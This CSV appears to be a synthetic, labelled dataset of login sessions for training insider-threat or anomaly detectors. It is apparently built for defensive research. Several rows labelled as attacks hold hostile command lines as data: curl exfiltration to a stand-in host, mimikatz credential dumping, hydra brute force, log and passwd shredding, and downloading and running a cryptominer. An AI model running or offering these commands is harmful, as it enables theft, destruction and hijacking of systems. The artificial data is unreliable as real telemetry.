timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2024-10-31 04:31:00,user_0063,contractor,12,4,2180,157,3,0,1,1,mfa,172.16.135.193,"Singapore, SG",bb20fc4c52d332a376ca32cb9fadb52c,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-07-09 04:12:24,user_0008,employee,15,1,2241,53,4,0,1,1,mfa,192.168.28.35,"London, UK",1bdc0888e6f69c2331454a77b817ca0a,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-10-02 04:52:38,user_0087,contractor,8,3,2111,80,1,0,1,1,sso,172.27.230.64,"London, UK",6d170658a3f44455ea4f4e492f5ddb30,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-05-19 08:46:09,user_0189,vendor,23,5,4543,1830,11,3,1,0,api_key,10.254.204.54,"Amsterdam, NL",ab7d4544706f20cf8d770942f730964b,secrets_vault,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2024-11-16 20:05:55,user_0059,employee,8,1,532,39,1,0,1,1,mfa,172.28.103.17,"London, UK",bca6a8ea562633f8684688e26f6489ed,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-10-30 10:04:54,user_0081,contractor,10,0,1657,124,5,0,1,1,sso,172.20.108.249,"London, UK",ff82d6aa9812cf54658327cd2a5c8537,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-01 04:56:57,user_0107,employee,14,3,2925,89,2,0,1,1,mfa,172.17.157.177,"Singapore, SG",5d4ea5557ae3a2bcc41067b0b056db30,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-02-14 11:39:56,user_0143,contractor,16,0,2231,55,4,0,1,1,sso,172.16.187.233,"London, UK",bc05863f71547d1cd711c3b5c3e3b4a4,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-08-12 20:03:19,user_0192,employee,8,2,2626,174,1,1,1,1,mfa,10.236.77.233,"Tokyo, JP",d30a18078389f3688212e4a441d13de3,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-15 22:56:13,user_0050,contractor,17,4,2395,34,3,1,1,1,password,10.15.35.131,"Tokyo, JP",7a0af22dcedb3c93778019abd2f626f8,email_server,ls -la; cat report.txt; logout,1,Normal
2025-02-07 13:05:15,user_0008,contractor,11,3,2959,87,10,5,1,0,sso,192.168.116.252,"Moscow, RU",a6e2c850d9578ce7099d445c459d7751,email_server,ls -la; cat report.txt; logout,1,Unusual Resource Access
2024-11-11 18:04:52,user_0018,contractor,13,2,984,102,2,1,1,1,sso,10.164.144.176,"Berlin, DE",ef1fe52123c636b3c436baddeea785f6,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-07-21 04:09:10,user_0199,contractor,11,4,1469,197,4,0,1,1,password,172.18.107.179,"London, UK",62ae8a9df43fa946aefa18dc5eb5f47a,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-05-17 23:10:43,user_0192,employee,8,2,418,176,2,0,1,1,password,10.86.155.233,"New York, US",5df9d3b46888496aa82c22aa291c5a2f,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-10-19 13:48:40,user_0144,contractor,10,4,682,185,4,1,1,1,password,172.31.127.197,"Berlin, DE",6675dd3a8e92e90a41b5f2ff543f049a,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-28 14:50:23,user_0137,contractor,13,3,1486,132,3,0,1,1,mfa,192.168.240.154,"New York, US",7f8ad217f828c67cbaa7d146efaab40d,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-28 08:45:01,user_0033,contractor,9,4,1344,86,4,0,1,1,mfa,172.25.72.123,"Tokyo, JP",71e16b6257ccada58b982bc0f9d6dd35,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-01-12 08:57:58,user_0119,employee,13,3,1450,122,1,1,1,1,password,10.226.111.7,"Tokyo, JP",5fa53fa6b51058e76c63d5830d62efab,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-22 05:21:48,user_0092,employee,10,2,2970,104,3,0,1,1,password,10.69.241.183,"Singapore, SG",0cdc9209f3c5362e951cd889240a4e39,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-22 08:05:35,user_0046,employee,8,1,1852,187,1,1,1,1,password,192.168.143.214,"Berlin, DE",e24b86010002a4cb52156f91c37a3948,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-30 03:35:59,user_0078,service_account,19,4,3508,338,2,0,0,0,oauth,207.37.153.186,"Dubai, AE",6828abf3fb193d123a44922e3da11105,financial_db,ls -la; cat report.txt; logout,1,Impossible Travel
2025-05-23 04:11:15,user_0011,contractor,19,1,11,9,2,12,0,1,password,223.98.224.163,"Moscow, RU",ee3f9cd399dd8a5f7612dcc274d695c1,devops_pipeline,unknown_cmd,0,Failed Login
2024-08-09 18:46:21,user_0194,contractor,12,3,2577,129,5,1,1,1,password,172.25.196.152,"London, UK",511f2bea1b76b9208230b06a37165dd4,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-08 04:57:34,user_0161,contractor,9,3,2232,179,2,0,1,1,mfa,192.168.128.244,"New York, US",9527c1d5a45ae83f368a8956508a6613,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-09 18:23:21,user_0003,employee,10,0,496,56,3,0,1,1,password,172.16.116.26,"Berlin, DE",15c4c9b1070ff5955f766c4d4bd8b1fb,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-23 21:20:13,user_0132,admin,16,5,377,2249,3,0,0,1,mfa,192.168.122.110,"Moscow, RU",2acdf8c800100026463b5cb48ac5ddad,financial_db,mimikatz.exe privilege::debug sekurlsa::logonpasswords,1,Suspicious Command
2025-04-13 03:56:26,user_0108,contractor,17,0,3124,96,3,0,1,1,sso,192.168.235.36,"Singapore, SG",44cb3beff586ee3b13b4c5c14f458794,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-05-29 12:06:42,user_0151,employee,9,0,2737,37,5,0,1,1,sso,192.168.17.25,"London, UK",32d06c00580ce578ebfe779ef784eac9,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-06-12 09:37:20,user_0030,employee,17,3,672,150,4,0,1,1,mfa,192.168.173.2,"London, UK",54586adfd714957b5b8e5a23a8b8f37d,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-30 19:59:13,user_0104,contractor,15,2,2818,41,4,0,1,1,password,192.168.132.159,"Berlin, DE",7d5f5b4b56620ca7b1cbb3d3841277ff,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-07-05 14:56:45,user_0060,contractor,18,1,3565,22,2,1,1,1,mfa,172.26.241.228,"Berlin, DE",951ea5a3b88aaa742bca56149afa7121,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-08-24 06:35:27,user_0023,contractor,8,2,652,170,1,1,1,1,mfa,192.168.169.197,"London, UK",2dcbe11cbb8987109d0b11353586b872,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-11-28 02:37:54,user_0162,employee,13,1,854,58,2,1,1,1,password,172.25.115.195,"Singapore, SG",e6dd3e7366d678121fdf2a7b4c63428f,email_server,ls -la; cat report.txt; logout,1,Normal
2024-06-18 03:52:01,user_0171,employee,11,3,1629,23,2,1,1,1,sso,10.3.55.138,"New York, US",2ffdcc3582b09fc3ed7ff3e9cc454aac,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-04-19 00:23:28,user_0051,contractor,17,2,1060,183,2,0,1,1,sso,192.168.51.126,"Singapore, SG",1fcf4c60afa19f4e410255c6908550a3,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-11 23:14:46,user_0103,contractor,9,2,1738,184,5,1,1,1,sso,192.168.209.159,"Singapore, SG",62db3022cba27f102f09fabb5a439255,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-22 18:02:51,user_0066,service_account,4,2,59,973,13,7,0,0,password,192.131.218.108,"Cape Town, ZA",e1eba981738282d0d23c9b0d5f43c4d7,customer_data,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-05-02 19:09:50,user_0123,employee,11,4,2941,152,5,0,1,1,password,10.237.227.249,"Tokyo, JP",63a4fe76e4a8986208d32183f51456b5,email_server,ls -la; cat report.txt; logout,1,Normal
2025-06-08 11:53:58,user_0178,contractor,10,1,785,64,2,1,1,1,password,10.80.124.134,"Tokyo, JP",8746cfd9a91f4366cb7b50bdd66dc4e4,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-07-08 22:37:15,user_0140,contractor,10,4,129708,467,12,6,1,0,vpn,12.153.219.255,"Mexico City, MX",a91c3f1cdae6d03c452c3028b3274bb7,vpn_gateway,ssh admin@192.168.1.50; sudo su; scp -r /etc root@10.0.0.2:/tmp,1,Session Hijacking
2024-09-03 14:39:10,user_0048,employee,10,0,1190,183,3,1,1,1,password,10.97.65.51,"London, UK",65ce61f9cc57ccabbbb75ea39b31ea65,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-03-11 22:36:17,user_0031,employee,13,1,3048,71,5,1,1,1,password,172.29.55.124,"Tokyo, JP",139f90a7fc28308485229040e4862059,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-09 08:44:18,user_0104,contractor,17,4,1839,188,3,1,1,1,password,192.168.94.46,"Singapore, SG",d32ca0658aa9222aa3deae877c49efa5,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-08-23 16:07:40,user_0123,employee,8,0,407,70,5,1,1,1,sso,192.168.68.97,"New York, US",218d1f9a0445b56bff0d3fd523b93046,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-30 07:53:30,user_0197,employee,18,4,2497,60,4,0,1,1,sso,192.168.255.246,"London, UK",74d4cbd388849efc50ef8c6ccbee1a68,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-01-13 15:26:01,user_0001,employee,16,3,2189,131,4,0,1,1,password,192.168.19.68,"New York, US",9ae50f2ff72f4dca2bcaea3b892ec4ab,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-08-21 13:21:02,user_0167,employee,9,3,2230,24,3,1,1,1,password,192.168.64.139,"London, UK",0b28f6ad7f2f0af4686ec2a240a4d08c,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-10-01 14:25:28,user_0081,employee,17,2,1048,194,2,1,1,1,sso,192.168.215.52,"London, UK",fb18c949f844cdf5629edd557c559534,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-26 01:38:53,user_0183,contractor,16,3,3500,158,1,0,1,1,sso,192.168.251.191,"Berlin, DE",88a4d83cdf16ed75995a8c4a941f9d70,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-03-12 00:42:40,user_0196,employee,17,1,2448,87,3,0,1,1,password,172.24.43.138,"London, UK",32778a1a7de6ec480c4c449eb8b6abca,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-12-23 16:10:51,user_0107,employee,9,1,371,142,3,1,1,1,sso,10.77.190.186,"Berlin, DE",598efbde2acb613c4ba108a8290d20ec,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-06-26 03:03:26,user_0176,contractor,9,4,2675,110,2,0,1,1,password,192.168.83.68,"Singapore, SG",389112aad4319c07d34b36e97270fa41,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-28 09:25:48,user_0048,employee,10,0,2313,170,5,0,1,1,password,10.227.63.180,"London, UK",a0ebf959307a96b3c86b544f8e12c599,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-09 20:13:46,user_0189,contractor,11,4,2284,122,5,0,1,1,mfa,172.30.112.73,"Tokyo, JP",91cc10cf767496d026479b53272b0da5,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-02-04 12:43:12,user_0040,contractor,3,5,237,675,12,0,1,1,password,192.168.184.29,"Sao Paulo, BR",16c3052d16004bed5008838a81fefc53,customer_data,rm -rf /var/log/*; shred -u /etc/passwd; history -c,1,Data Destruction
2025-03-26 07:07:10,user_0088,vendor,1,4,38,55,7,11,0,0,password,201.25.140.189,"Mexico City, MX",5b6a8bbff5b3dbbb26398fd5e21bbaa5,payroll_system,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target,0,Credential Abuse
2024-01-13 08:22:59,user_0145,vendor,21,5,6200,1684,16,5,1,1,sso,10.62.99.81,"Beijing, CN",ff6d57c67b3db3618c835a851a73c197,vpn_gateway,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2025-03-01 15:54:28,user_0184,contractor,13,2,2468,74,3,1,1,1,mfa,10.160.239.251,"Tokyo, JP",dea9865f8a857a564e9cec9137317bd2,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-10-28 05:18:37,user_0127,contractor,11,1,2583,136,2,0,1,1,password,192.168.204.237,"Berlin, DE",69754583a6daed737d393fa2a073b668,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-05-18 23:22:30,user_0108,employee,9,1,3151,35,2,0,1,1,mfa,10.109.211.232,"Singapore, SG",e7fe1ed2aeab751881fae40c76ae16c6,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-03 19:08:11,user_0114,employee,17,1,2133,184,4,0,1,1,mfa,192.168.251.34,"Berlin, DE",a8d99d74c0e1e3c4ddf3afe40449004c,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-12-10 19:45:40,user_0017,employee,10,4,1684,46,4,0,1,1,password,10.37.10.100,"Berlin, DE",2ff237d8390dc3533a81585c089242e5,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-31 17:18:03,user_0025,contractor,15,4,3214,24,5,0,1,1,mfa,10.41.212.195,"Berlin, DE",1a5357d600e1352f520a3f1c61dc0dcb,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-05-04 03:16:22,user_0112,contractor,18,0,1747,47,1,1,1,1,sso,192.168.71.179,"Tokyo, JP",fa14913a7033c0d2d9772e2051dd63b6,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-06-14 08:50:59,user_0197,employee,22,3,1805,2167,18,0,1,1,api_key,192.168.79.118,"Cape Town, ZA",7bb6263a42823819b45dbbbcd754673e,crm_platform,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2024-02-13 09:17:26,user_0131,employee,15,0,578,55,2,0,1,1,sso,10.70.71.163,"London, UK",507d1ec355a67c45e117434288a940ab,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-01-09 23:05:10,user_0112,employee,8,4,3198,159,1,1,1,1,password,192.168.229.44,"London, UK",cee74fe2da3624ce7b8abc9144e91e40,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-07-26 10:17:20,user_0053,employee,12,3,3160,144,1,0,1,1,sso,10.245.210.28,"Singapore, SG",65668ab813528b9fa90e3f40fd069ef0,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-06-03 15:28:21,user_0147,contractor,10,0,3492,150,1,0,1,1,mfa,10.29.179.67,"London, UK",dc5fab2db7d2b79dbd0254d3e541a999,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-06-23 20:25:51,user_0103,employee,10,0,1789,70,3,0,1,1,sso,10.161.29.92,"Tokyo, JP",0ae55a6e96230059323776885dc2b5ae,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-04-13 16:02:24,user_0136,employee,11,4,791,136,1,0,1,1,mfa,10.249.244.130,"London, UK",43b1b43ceee3f9a58c470fb725ffa01f,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-10-25 04:47:16,user_0117,contractor,14,4,2836,45,3,0,1,1,mfa,192.168.107.35,"Singapore, SG",2fdd8a3c5923d5a492cfd6fc3b667032,email_server,ls -la; cat report.txt; logout,1,Normal
2024-05-03 18:21:05,user_0191,employee,11,6,2686,184,11,3,1,1,sso,172.20.13.109,"Beijing, CN",6efbc017afe79c7a3c9e7e7089f58c61,erp_system,ls -la; cat report.txt; logout,1,Unusual Resource Access
2024-07-29 07:10:41,user_0036,admin,13,0,2926,114,5,0,0,0,oauth,8.62.188.32,"Cape Town, ZA",f3ffbad842d385e549e0ebe965d2316c,source_code_repo,ls -la; cat report.txt; logout,1,Impossible Travel
2024-10-16 14:04:35,user_0099,employee,12,2,1739,98,4,0,1,1,password,172.19.111.54,"Tokyo, JP",1d88aa9c673f7656a7343419b4780a48,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-09 06:08:29,user_0013,contractor,15,4,2979,192,4,1,1,1,sso,10.63.140.163,"New York, US",1f5b5e9cf3c5f5d009b691b331fa155e,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-01-17 10:32:42,user_0061,contractor,14,3,3538,31,5,0,1,1,password,192.168.120.133,"London, UK",5a6d351bc2e417d22c6c932efda2feca,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-21 15:49:34,user_0194,contractor,15,3,2261,196,1,1,1,1,mfa,10.13.85.199,"Tokyo, JP",371e7efd1cb1133a70e300ea0006c2b0,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-01-30 18:01:23,user_0036,contractor,15,1,3408,200,4,1,1,1,sso,10.58.148.38,"New York, US",c91103c3d687a527df82d802facdf242,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-25 06:54:39,user_0116,contractor,16,3,3004,68,1,1,1,1,password,172.17.209.9,"Berlin, DE",191dbd7804109860c86c83611d5d7fbb,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-30 02:14:37,user_0046,contractor,9,1,1517,146,3,0,1,1,sso,192.168.220.250,"Singapore, SG",9a1fcc74d24b90bcab91f63f59a52f83,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-23 17:14:39,user_0066,employee,16,1,3509,76,2,1,1,1,password,10.187.187.52,"New York, US",6a3f30e2273d8ecc8cfd89f4aba0354c,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-20 16:53:38,user_0083,employee,15,0,3129,192,2,1,1,1,mfa,10.83.51.50,"Singapore, SG",a5ce3237855f80fb7ac5df0e84ce1521,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-24 17:33:13,user_0130,contractor,10,0,3146,98,2,1,1,1,mfa,10.168.239.231,"London, UK",d188f6ed0487dbc4cb48da126c42cea0,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-02-15 15:52:37,user_0098,employee,16,4,1402,99,4,1,1,1,password,192.168.219.52,"Singapore, SG",21ede056be4e53927b07a339572379fd,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-05-30 20:14:57,user_0111,employee,9,3,1467,185,1,0,1,1,sso,172.20.39.115,"London, UK",1e74ac1072b2baf39467209a2ae2df55,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-02-27 06:48:46,user_0148,employee,13,0,2143,139,5,1,1,1,password,172.26.235.107,"Singapore, SG",ad23071935f8ccd38c2ccda1decb167d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-02-04 22:52:24,user_0101,vendor,3,2,61086,608,0,4,0,0,password,148.26.237.192,"Sydney, AU",ba13f9799e3f3298c0c4514a217ea790,crm_platform,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2025-06-05 12:32:31,user_0129,employee,17,3,1042,193,3,1,1,1,password,10.156.224.68,"Tokyo, JP",c1ec45665fef07347d745e3a71246ec0,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-12 09:36:28,user_0050,service_account,13,6,168126,459,3,0,1,0,vpn,209.247.234.80,"Beijing, CN",c72957554f47ec128f417af079a1e29f,source_code_repo,ssh admin@192.168.1.50; sudo su; scp -r /etc root@10.0.0.2:/tmp,1,Session Hijacking
2025-01-06 23:32:28,user_0050,contractor,17,4,958,183,5,1,1,1,mfa,192.168.116.190,"Berlin, DE",88a549e654e56319d6d4ac1ebf5a9004,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-05-23 18:08:08,user_0131,contractor,14,1,357,170,5,0,1,1,mfa,10.74.238.176,"Singapore, SG",5b3925ea4dd69734dc7a26c8183cd9fa,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-15 07:25:47,user_0083,employee,9,1,2730,171,4,1,1,1,password,172.21.97.215,"Tokyo, JP",10e4b21aaf7e621f2a9d04fdc22a7a24,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-02-26 17:22:08,user_0149,employee,14,2,3168,36,5,0,1,1,password,172.21.15.229,"Tokyo, JP",0b3377b0df8a0eb02a4698bfc5313d71,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-24 14:13:57,user_0196,employee,10,4,765,189,2,1,1,1,password,172.30.134.174,"Tokyo, JP",efb881a7150c388a56a9d971097929b0,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-12 06:10:37,user_0041,contractor,12,1,764,189,2,1,1,1,password,192.168.52.163,"New York, US",17ba394169eca80231e3687de2253cbf,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-10-14 01:12:54,user_0083,employee,13,2,997,167,4,0,1,1,sso,172.31.217.207,"New York, US",5559088a8be79faf21862cbba0ab3b8f,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-02-07 16:19:01,user_0188,employee,8,4,3482,91,1,0,1,1,mfa,172.25.139.153,"Singapore, SG",1266487463667182a48a9769def03c6d,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-27 06:18:21,user_0074,employee,9,2,1825,126,3,0,1,1,password,10.124.55.223,"Singapore, SG",a12a059f8938d30f6e98e98842f5bcdb,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-05-30 16:42:45,user_0045,contractor,13,3,2243,29,2,1,1,1,password,10.140.23.112,"Tokyo, JP",84397a8e631d503a871718cea507145f,email_server,ls -la; cat report.txt; logout,1,Normal
2025-06-11 19:12:22,user_0012,employee,16,1,3517,80,1,0,1,1,mfa,192.168.215.227,"London, UK",45dd427fbffcc3874c8573d41d7c59e9,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-01 06:33:46,user_0070,contractor,17,4,1865,36,4,0,1,1,mfa,172.21.110.145,"London, UK",dddf32a9efbb871577105ee349a7e019,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-05-09 00:51:10,user_0124,employee,13,0,2014,122,5,0,1,1,password,172.25.162.56,"London, UK",076ffd12e393f48a4a9c81fc9e0db6ea,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-08-11 10:25:20,user_0149,contractor,11,4,810,200,4,1,1,1,sso,172.30.4.12,"Singapore, SG",0ba97c84cfe78e7764124f8b5c8a76d8,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-04 14:13:12,user_0193,employee,9,4,1036,24,3,0,1,1,password,192.168.120.12,"Singapore, SG",27d95c43dfef4489aad6c5b4247b3396,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-01-29 13:01:46,user_0039,employee,6,0,74018,335,1,1,0,0,password,148.145.184.247,"Dubai, AE",26c70f923e6a75776d42796653548309,financial_db,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-10-11 13:20:02,user_0013,employee,17,0,353,73,4,0,1,1,mfa,172.20.27.103,"New York, US",9ce3a438bc8ff996adb97ab3de81f235,email_server,ls -la; cat report.txt; logout,1,Normal
2024-05-05 05:10:37,user_0168,employee,16,2,3384,28,1,0,1,1,sso,10.53.89.144,"Berlin, DE",6797c9eff6b258248851a2b6573bc0c7,email_server,ls -la; cat report.txt; logout,1,Normal
2024-11-08 13:17:12,user_0084,contractor,16,1,1085,127,4,0,1,1,sso,192.168.64.122,"Singapore, SG",6f09dcb3a1cdd5231069f9f92d9b9ab4,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-05-16 05:40:52,user_0095,contractor,11,3,1040,155,1,1,1,1,password,10.210.166.179,"London, UK",55eca3b82550614b552c74c849b70718,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-02-03 07:46:02,user_0091,employee,18,2,2375,70,3,0,1,1,sso,172.19.126.135,"Berlin, DE",d8673e9fca1809e5b5331d39e2c0a2ef,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-04-22 17:07:17,user_0112,contractor,11,0,456,195,2,1,1,1,mfa,10.175.249.109,"New York, US",05a7b7e4324c5cf251857e9d51b262c2,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-17 07:46:12,user_0141,contractor,11,0,571,61,1,1,1,1,sso,10.104.180.22,"Tokyo, JP",c04a4dad62c53c38a04651d685e1c600,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-11-24 18:42:54,user_0182,contractor,9,0,2581,35,1,1,1,1,password,10.69.31.168,"Tokyo, JP",bf4eb1762cb7f55d42e62b9eb625cbc0,email_server,ls -la; cat report.txt; logout,1,Normal
